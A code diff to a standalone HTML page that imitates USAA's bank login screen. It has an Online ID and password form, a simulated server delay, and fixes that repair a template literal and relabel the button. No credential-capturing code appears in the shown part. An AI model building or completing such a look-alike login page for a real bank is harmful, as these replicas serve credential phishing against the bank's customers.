@@ -46,7 +46,7 @@
       align-items: flex-start;
       padding: 50px 10%;
       position: relative;
-      flex-wrap: wrap; /* Enable wrapping for smaller screens */
+      flex-wrap: wrap;
     }
 
     .new-to-usaa {
@@ -54,7 +54,7 @@
       text-align: left;
       font-size: 16px;
       color: white;
-      flex: 1 1 300px; /* Allow it to shrink or grow */
+      flex: 1 1 300px;
     }
 
     .new-to-usaa strong {
@@ -69,7 +69,7 @@
       box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
       text-align: center;
       color: black;
-      flex: 1 1 350px; /* Allow it to shrink or grow */
+      flex: 1 1 350px;
     }
 
     h1, h2 {
@@ -254,7 +254,7 @@
     <a href="#" class="footer-link">Accessibility at USAA</a>
   </footer>
 
-  <script>
+ <script>
   const nextButton = document.getElementById('next-button');
   const loginForm = document.getElementById('login-form');
 
@@ -273,7 +273,7 @@
     // Simulate a delay for server response
     setTimeout(() => {
       // Replace spinner with password form
-      loginForm.innerHTML = 
+      loginForm.innerHTML = `
         <label for="online-id">Online ID</label>
         <input type="text" id="online-id" value="${onlineId}" readonly>
         <label for="password">Password</label>
@@ -285,8 +285,8 @@
           <input type="checkbox" id="remember-browser">
           <label for="remember-browser" style="font-size: 14px;">Remember this browser to log on faster next time.</label>
         </div>
-        <button type="button" id="login-button">Next</button>
-      ;
+        <button type="button" id="login-button">Log In</button>
+      `;
 
       // Add functionality to toggle password visibility
       const togglePassword = document.getElementById('toggle-password');
@@ -303,7 +303,7 @@
         }
       });
     }, 2000); // 2-second delay for spinner
-  }); // JavaScript code as provided in your original script
- </script>
+  });
+</script>
 </body>
 </html>
